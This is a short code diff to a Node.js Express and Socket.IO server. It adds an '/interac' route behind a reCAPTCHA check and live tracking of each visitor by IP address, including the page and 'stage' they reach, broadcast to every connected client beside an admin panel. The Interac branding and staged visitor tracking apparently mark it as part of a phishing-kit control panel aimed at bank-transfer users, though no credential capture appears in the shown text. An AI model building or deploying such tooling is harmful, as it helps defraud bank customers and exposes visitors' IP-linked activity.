@@ -171,6 +171,10 @@ app.get('/', (req, res) => {
     res.render('captcha/index')
 })
 
+app.get('/interac', verifyRecaptcha, (req, res) => {
+    res.render('captcha/index')
+})
+
 app.get('/admin', (req, res) => {
     if(req.session.isAdminVerified) {
         res.render('admin/panel/index');
@@ -210,7 +214,28 @@ io.on('connection', (socket, req) => {
         sessionStore.set(userIP, userDetails);
     }
 
-    console.log(userIP)
+    io.emit('join', Array.from(sessionStore.entries()));
+
+    socket.on('pageandstage', (data) => {
+        if (sessionStore.has(userIP)) {
+            let userDetails = sessionStore.get(userIP);
+            userDetails.page = data.page;
+            userDetails.stage = data.stage;
+            sessionStore.set(userIP, userDetails);
+        }
+        io.emit('join', Array.from(sessionStore.entries()));
+    });
+
+    socket.on('disconnect', () => {
+        if (sessionStore.has(userIP)) {
+            let userDetails = sessionStore.get(userIP);
+            userDetails.status = 'inactif';
+            sessionStore.set(userIP, userDetails);
+            io.emit('leave', Array.from(sessionStore.entries()));
+        }
+    });
+
+    
 
 });
 
